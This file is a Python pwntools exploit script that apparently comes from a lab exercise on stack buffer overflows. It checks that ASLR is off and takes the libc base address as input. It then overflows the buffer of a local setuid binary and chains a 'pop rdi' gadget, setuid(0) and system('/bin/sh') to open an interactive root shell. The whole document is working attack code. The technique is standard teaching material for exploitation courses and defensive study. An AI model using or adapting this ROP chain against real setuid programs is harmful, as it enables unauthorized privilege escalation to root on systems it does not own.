#!/usr/bin/env python3
from pwn import asm, context, ELF, log, p64, process, sys


with open("/proc/sys/kernel/randomize_va_space", "r") as f:
    if f.readline().strip() != "0":
        log.error("Make sure ASLR is disabled!")

target = "../binaries/simple-bo-rop-setuid"
if len(sys.argv) != 2:
    print("Missing LibC base address")
    sys.exit(1)

context.update(arch="amd64", os="linux")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# if ASLR is off, we know this!
libc.address = int(sys.argv[1], 16)
system_address = libc.symbols.system
setuid_address = libc.symbols.setuid
log.info(f"LibC base adress: {hex(libc.address)}")
log.info(f"system() adress: {hex(system_address)}")

# Stack smashing (str len + caller function's rbp, i.e., 8 bytes)
payload = b"A" * 0x10 + b"YADAYADA"

# ROP program:
# setuid(0)
# system("/bin/sh")
payload += p64(next(libc.search(asm("pop rdi; ret;"))))
payload += p64(0)
payload += p64(setuid_address)
payload += p64(next(libc.search(asm("pop rdi; ret;"))))
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(system_address)

# with open("./input-rop-v2.txt", "wb") as f:
#     f.write(payload + b"\n")

process = process(target)
_ = process.recvline_containsS("What is your name?", timeout=3)

print("Injecting malicious input")
process.sendline(payload)
_ = process.recvline_containsS("Hello ", timeout=3)

process.clean()
process.interactive()
